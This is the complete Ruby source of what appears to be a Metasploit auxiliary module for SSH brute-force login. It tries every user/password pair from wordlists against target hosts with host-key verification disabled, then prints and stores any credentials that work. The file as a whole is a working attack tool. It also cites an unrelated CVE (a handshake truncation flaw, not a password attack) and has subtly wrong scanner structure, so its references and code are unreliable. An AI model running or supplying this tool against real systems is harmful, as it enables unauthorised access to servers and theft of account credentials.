##
# SSH Brute Force Module
# Metasploit module for SSH brute-force attack simulation
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'SSH Bruteforce Login Utility',
      'Description'    => 'SSH Login Utility',
      'Author'         => 'SSH BFD Project',
      'References'     =>
        [
          [ 'CVE', '2023-48795' ]
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'PASS_FILE' => '/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt',
          'USER_FILE' => '/usr/share/metasploit-framework/data/wordlists/unix_users.txt',
          'THREADS'   => 10
        }
    )

    register_options(
      [
        Opt::RHOSTS,
        Opt::RPORT(22),
        OptString.new('USERNAME', [ false, 'Single username to test']),
        OptString.new('USER_FILE', [ false, 'File containing usernames, one per line']),
        OptString.new('PASS_FILE', [ false, 'File containing passwords, one per line']),
        OptBool.new('DB_ALL_USERS', [ false, 'Add all users in current DB as targets', false]),
        OptBool.new('STOP_ON_SUCCESS', [ false, 'Stop when a credential works', false])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'SSH timeout in seconds', 10])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def cleanup
    super
  end

  def run
    print_status("Starting SSH brute force against #{rhost}:#{rport}")

    # Get username and password lists
    users = []
    passwords = []

    if datastore['USERNAME']
      users << datastore['USERNAME']
    elsif datastore['USER_FILE']
      users = File.readlines(datastore['USER_FILE']).map(&:strip).reject(&:empty?)
    end

    passwords = File.readlines(datastore['PASS_FILE']).map(&:strip).reject(&:empty?)

    print_status("Testing #{users.length} users with #{passwords.length} passwords")

    # Attempt login
    users.each do |user|
      passwords.each do |password|
        begin
          result = ssh_login(user, password)
          if result[:success]
            print_good("SUCCESS: #{user}:#{password}")

            # Store credential
            store_loot(
              'ssh.credentials',
              'text/plain',
              rhost,
              "#{user}:#{password}"
            )

            break if datastore['STOP_ON_SUCCESS']
          else
            vprint_status("FAILED: #{user}:#{password}")
          end
        rescue => e
          print_error("Error: #{e.message}")
        end
      end
    end

    print_status("Brute force complete")
  end

  def ssh_login(user, password)
   Net::SSH.start(rhost, user, {
      :password => password,
      :port => rport,
      :timeout => datastore['SSH_TIMEOUT'],
      :verify_host_key => :never
    }) do |ssh|
      return { :success => true, :session => ssh }
    end
  rescue Net::SSH::AuthenticationFailed
    return { :success => false }
  rescue => e
    return { :success => false, :error => e.message }
  end
end
